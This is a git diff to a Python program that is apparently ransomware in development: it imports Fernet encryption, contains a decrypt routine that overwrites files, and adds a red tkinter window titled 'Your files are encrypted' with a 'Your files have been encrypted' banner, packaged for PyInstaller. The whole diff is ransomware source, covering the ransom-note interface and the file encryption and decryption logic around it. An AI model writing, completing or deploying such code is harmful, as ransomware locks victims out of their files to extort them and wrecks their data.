@@ -1,7 +1,7 @@
 from pathlib import Path
 from cryptography.fernet import Fernet
 import sys 
-import tinker as tk 
+import tkinter as tk 
 from tkinter import messagebox
 from PIL import Image, ImageTk
 import os
@@ -117,4 +117,55 @@ def decrypt (user_phrase):
             with open(file,"wb") as newFile:
                 newFile.write(decrypted_content)
 
-#encrypt()
+
+# Submit function
+
+# On close funcyion
+
+# Read files
+def relativePath(relative_path):
+    try:
+        base_path=Path(sys._MEIPASS) # A temporary folder
+    except:
+        base_path=Path(".")
+
+    return base_path/relative_path
+
+# Define image path
+image_path=relativePath("images.png")
+
+# We call the encryption function
+
+# User interface
+root=tk.Tk()
+root.title("Your files are encrypted")
+root.resizable(False, False)
+root.config(bg="#cc0000")
+
+
+# Icon image
+icon =tk.PhotoImage(file=relativePath("images.png"))
+root.iconphoto(True, icon)
+
+#Resize sizeof window
+window_width=400
+window_height=350
+
+screen_width=root.winfo_screenwidth()
+screen_height=root.winfo_screenheight()
+
+x=int((screen_width/2)-(window_width/2))
+y=int((screen_height/2)-(window_height/2))
+
+root.geometry(f"{window_width}x{window_height}+{x}+{y}")
+
+title=tk.Label(
+    text="Your files have been encrypted",
+    font=("Arial", 14, "bold"),
+    bg="#cc0000",
+    fg="white",
+)
+title.pack(pady=5)
+ 
+# Show tha dialog
+root.mainloop()
